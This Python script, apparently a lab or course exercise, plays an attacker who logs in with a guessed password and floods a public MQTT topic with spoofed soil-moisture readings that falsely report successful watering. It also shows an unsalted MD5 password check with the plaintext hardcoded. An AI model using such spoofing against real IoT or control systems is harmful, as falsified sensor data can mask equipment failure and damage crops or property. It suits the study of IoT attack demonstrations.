import paho.mqtt.client as mqtt
from time import sleep
from random import randint
import hashlib

broker_address = "broker.emqx.io"
topic = "system/plant/soilinfo"

def hash_password(input):
    return hashlib.md5(input.encode()).hexdigest() == '051ebc83e3617c4304d6f5ba51d2cc75'

def login():
    user_input = "UTSA2024" # Assuming the attacker figured out the password
    return hash_password(user_input)

if login():
    client = mqtt.Client("Attacker")
    client.connect(broker_address)

    while True:
        # Simulating normal moisture levels
        current_moisture = randint(500, 600)
        data = f'Current Moisture: {current_moisture}\nWATERING STATUS: SUCCESS'
        
        client.publish(topic, data)
        
        sleep(0.5)
else:
    print("Wrong password. Exiting...")
